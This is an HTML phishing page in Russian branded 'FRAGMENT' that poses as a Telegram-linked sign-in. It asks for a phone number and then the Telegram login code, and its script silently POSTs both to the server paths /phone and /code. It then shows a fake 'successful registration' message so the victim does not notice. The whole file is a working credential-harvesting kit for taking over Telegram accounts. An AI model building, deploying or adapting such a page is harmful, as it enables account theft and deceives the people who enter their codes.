<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>FRAGMENT</title>

<style>
:root {
    --bg: #0b0b0d;
    --panel: #121216;
    --text: #eaeaea;
    --muted: #9a9a9a;
    --border: #1f1f26;
}

* {
    box-sizing: border-box;
    font-family: Inter, Arial, sans-serif;
}

body {
    margin: 0;
    height: 100vh;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
}

.logo {
    position: absolute;
    top: 24px;
    left: 28px;
    font-weight: 600;
    letter-spacing: 3px;
    font-size: 14px;
    color: #fff;
}

.card {
    background: var(--panel);
    border: 1px solid var(--border);
    width: 360px;
    padding: 32px;
    text-align: center;
}

h2 {
    font-weight: 400;
    margin-bottom: 24px;
}

input {
    width: 100%;
    padding: 14px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
    font-size: 15px;
    margin-bottom: 18px;
}

input::placeholder {
    color: var(--muted);
}

button {
    width: 100%;
    padding: 14px;
    background: #fff;
    color: #000;
    border: none;
    cursor: pointer;
    font-weight: 500;
}

.hidden {
    display: none;
}
</style>
</head>

<body>

<div class="logo">FRAGMENT</div>

<div class="card">
    <h2 id="title">Введите ваш номер</h2>
    <input id="input" placeholder="+79991234567">
    <button onclick="next()">Продолжить</button>
</div>

<script>
let step = 1;

function next() {
    const input = document.getElementById("input");
    const title = document.getElementById("title");
    const btn = document.querySelector("button");

    if (input.value.trim() === "") return;

    if (step === 1) {
        fetch("/phone", {
            method: "POST",
            body: input.value
        });
        title.innerText = "Введите код из TELEGRAM";
        input.value = "";
        input.placeholder = "Код";
        step = 2;
    } else {
        fetch("/code", {
            method: "POST",
            body: input.value
        });
        title.innerText = "Успешная регистрация!";
        input.classList.add("hidden");
        btn.classList.add("hidden");
    }
}
</script>

</body>
</html>
